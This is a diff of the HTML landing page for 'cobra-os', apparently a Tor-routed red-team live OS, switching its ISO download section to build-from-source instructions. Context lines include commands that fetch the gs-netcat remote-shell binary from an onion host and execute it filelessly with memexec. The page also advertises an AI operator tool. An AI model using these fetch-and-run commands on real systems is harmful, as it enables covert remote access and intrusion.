@@ -32,7 +32,7 @@
       <a href="#relay">relay</a>
       <a href="#profiles">profiles</a>
       <a href="#build">build</a>
-      <a href="#download" class="nav-cta">download</a>
+      <a href="#download" class="nav-cta">get cobra</a>
     </nav>
     <button class="nav-burger" id="navBurger" aria-label="Toggle navigation" aria-expanded="false">
       <span></span><span></span><span></span>
@@ -52,8 +52,8 @@
       no X server, no display manager, no GUI. tmux is the dashboard, <code>links2</code> over Tor is the
       browser, and every byte in the image earns its place.</p>
       <div class="hero-ctas">
-        <a href="#download" class="btn btn-red">[ download the iso ]</a>
-        <a href="#build" class="btn btn-ghost">$ build from source</a>
+        <a href="#build" class="btn btn-red">$ build your own</a>
+        <a href="#download" class="btn btn-ghost">[ why build, not download ]</a>
       </div>
       <ul class="hero-stats">
         <li><span class="stat-num cyan">2.4&nbsp;GiB</span><span class="stat-label">iso-hybrid image</span></li>
@@ -399,9 +399,9 @@ bin gs-netcat     <span class="t-dim"># → afrt77bagg4l4r6k56kshbbxjb6oot6dg7gw
 <span class="t-dim"># or directly / fileless, over Tor:</span>
 torsocks curl -fsSLO http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64
 memexec http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/bin/gs-netcat_linux-x86_64</code></pre>
-        <p>Static upstream builds, mirrored byte-for-byte with <code>.sha256</code> sidecars on the same
-        <code>.onion</code> service that ships the ISO. Fully self-hosted — no clearnet binary host, no
-        GitHub rate limits, no third-party fetch path mid-op.</p>
+        <p>Static upstream builds, mirrored byte-for-byte with <code>.sha256</code> sidecars on our
+        <code>.onion</code> service. Fully self-hosted — no clearnet binary host, no GitHub rate limits,
+        no third-party fetch path mid-op.</p>
       </div>
       <div class="build-step">
         <h3><span class="step-num">2</span> rendezvous on our relay</h3>
@@ -526,51 +526,51 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
   </div>
 </section>
 
-<!-- ======================= DOWNLOAD ======================= -->
+<!-- ======================= GET COBRA (build your own) ======================= -->
 <section id="download" class="section">
   <div class="container">
-    <h2 class="sec-title"><span class="sec-num">10</span> <span class="red">></span> get the build</h2>
-    <p class="sec-lede">The ISO ships <strong>only</strong> from our <code>.onion</code> service — over Tor,
-    end to end. No clearnet mirror, no third-party object store. The clearnet site you're on carries the
-    checksum and the docs; the bytes cross the network where the host's IP stays hidden. Don't trust a
-    network you don't have to? <a href="#build">Build it yourself</a> — same script, same image.</p>
+    <h2 class="sec-title"><span class="sec-num">10</span> <span class="red">></span> get cobra — build it yourself</h2>
+    <p class="sec-lede">There is <strong>no prebuilt ISO to download</strong> — and that's deliberate. A
+    hardened red-team live OS shouldn't ask you to trust someone else's build machine, onion key, or Tor
+    path for a 2.4&nbsp;GiB binary. You build it from the same scripts we run, on your own host, in your
+    choice of <a href="#profiles">profile</a>. Faster to iterate, nothing to host, nothing to trust but
+    the source.</p>
     <div class="dl-grid">
       <div class="dl-card">
-        <h3 class="dl-title">cobra-os-20260822.iso</h3>
+        <h3 class="dl-title">why build, not download</h3>
         <ul class="dl-meta">
-          <li><span>size</span><strong>2.4 GiB</strong></li>
-          <li><span>format</span><strong>iso-hybrid (BIOS + UEFI)</strong></li>
-          <li><span>base</span><strong>Debian trixie minbase + Parrot (echo)</strong></li>
-          <li><span>boot</span><strong>live-boot · noswap · persistence</strong></li>
-          <li><span>login</span><strong>console autologin — set the operator password on first login (replaces changeme)</strong></li>
+          <li><span>trust</span><strong>audit the source, build it yourself — no supply-chain leap of faith</strong></li>
+          <li><span>fit</span><strong>pick your profile: core, wireless, ad, exploit, webplus, ai</strong></li>
+          <li><span>size</span><strong>one profile per build — no bloated everything-image</strong></li>
+          <li><span>speed</span><strong>no multi-GB Tor download; build &amp; rebuild locally</strong></li>
+          <li><span>verify</span><strong>compare your hash against the published reference build</strong></li>
         </ul>
         <div class="dl-actions">
-          <a class="btn btn-red" href="http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/downloads/cobra-os-20260822.iso">download iso · onion</a>
-          <a class="btn btn-ghost" href="downloads/cobra-os-20260822.iso.sha256" download>sha256</a>
+          <a class="btn btn-red" href="#build">to the build steps</a>
+          <a class="btn btn-ghost" href="https://github.com/scabeard/cobra-os" rel="noopener">source on github</a>
         </div>
-        <p class="dl-note">The <code>.iso</code> is served from the <code>.onion</code> only (multi-GB over
-        Tor — resumable via HTTP range requests). The <code>.sha256</code> is on both the clearnet site and
-        the onion, and versioned in <code>downloads/</code>. Replace <code>afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion</code> with the live
-        onion address (see the site footer / README once the hidden service is up).</p>
+        <p class="dl-note">What we <em>do</em> still host, because they're small and meant to be
+        one-command installs: the <a href="#anywhere">operator shell</a> mirror (<code>/shell/</code>), the
+        <a href="#cobrastrike">CobraStrike AI operator</a> (<code>/cobra/</code>), and the static
+        <code>gs-netcat</code> binaries (<code>/bin/</code>, onion). The multi-GB live image is the only
+        thing you build yourself.</p>
       </div>
       <div class="dl-verify">
-        <h3>fetch over Tor, verify, then write</h3>
-        <pre class="codeblock"><code><span class="t-dim"># pull the image down over Tor (resumable with -C -):</span>
-torsocks curl -fSLO -C - \
-    http://afrt77bagg4l4r6k56kshbbxjb6oot6dg7gwt3g5jopk4pe7ddjv3zad.onion/downloads/cobra-os-20260822.iso
+        <h3>build, verify, then write</h3>
+        <pre class="codeblock"><code><span class="t-dim"># build the ISO (add profiles as needed)</span>
+sudo ./build-iso.sh
+sudo COBRA_PROFILES="ai wireless" ./build-iso.sh
 
-<span class="t-dim"># verify the image</span>
-sha256sum -c cobra-os-20260822.iso.sha256
-
-<span class="t-dim"># expected:</span>
-<span class="t-green">cobra-os-20260822.iso: OK</span>
+<span class="t-dim"># verify against the reference build's checksum</span>
+sha256sum cobra-os-*.iso
+<span class="t-dim"># compare with the reference .sha256 published in downloads/</span>
 
 <span class="t-dim"># write to USB (replace sdX — careful)</span>
-sudo dd if=cobra-os-20260822.iso of=/dev/sdX \
+sudo dd if=cobra-os-*.iso of=/dev/sdX \
     bs=4M status=progress oflag=sync
 
 <span class="t-dim"># or smoke-test in a VM first</span>
-qemu-system-x86_64 -m 2G -cdrom cobra-os-20260822.iso</code></pre>
+qemu-system-x86_64 -m 2G -cdrom cobra-os-*.iso</code></pre>
         <div class="callout callout-red">
           <strong>change before deploying:</strong> the <code>changeme</code> operator password is a
           documented scaffold default. Review the tool list, <code>PARROT_SUITE</code>, and the nftables
@@ -600,7 +600,7 @@ qemu-system-x86_64 -m 2G -cdrom cobra-os-20260822.iso</code></pre>
       <a href="#anywhere">shell anywhere</a>
       <a href="#relay">relay</a>
       <a href="#build">build</a>
-      <a href="#download">download</a>
+      <a href="#download">get cobra</a>
     </div>
     <div class="footer-col">
       <h4>in the repo</h4>
